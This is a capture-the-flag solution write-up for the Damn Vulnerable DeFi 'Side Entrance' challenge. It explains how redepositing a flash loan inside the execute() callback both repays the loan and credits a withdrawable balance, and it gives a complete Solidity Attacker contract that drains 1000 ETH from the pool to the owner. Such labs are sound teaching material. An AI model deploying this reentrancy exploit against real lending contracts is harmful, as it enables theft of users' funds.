CTF: https://www.damnvulnerabledefi.xyz/challenges/side-entrance/

soolution :


🎯 Goal:
Drain 1000 ETH from the vulnerable SideEntranceLenderPool contract.

💥 What's the vulnerability?
The pool has these features:

Anyone can deposit and withdraw ETH.

It also gives flash loans (borrow and repay in the same transaction).

Flash loan gives ETH and then calls your contract’s execute() function.

But here’s the problem:

Inside your execute() function, you can re-enter the pool and deposit the loaned ETH back using the deposit() function.

And that deposit:

Satisfies the loan condition (because the ETH comes back).

Also credits your contract in the pool's internal balance!

🚀 Attack Plan:
Take a flash loan of 1000 ETH.

In the execute() function, immediately deposit the 1000 ETH back.

The pool thinks the flash loan was repaid — ✅.

But now your contract has a 1000 ETH internal balance in the pool.

You call withdraw() to take out the full 1000 ETH.

Finally, send the ETH to your wallet.




contract Attacker {
    SideEntranceLenderPool public pool;
    address public owner;

    constructor(address _pool) {
        pool = SideEntranceLenderPool(_pool);
        owner = msg.sender;
    }

    // Step 1: Start the attack
    function attack() external {
        pool.flashLoan(1000 ether); // borrow all ETH
        pool.withdraw(); // withdraw credited deposit
        payable(owner).transfer(address(this).balance); // send to attacker
    }

    // Step 2: Pool calls this after giving us the loan
    function execute() external payable {
        pool.deposit{value: msg.value}(); // deposit the ETH back
    }

    receive() external payable {}
}
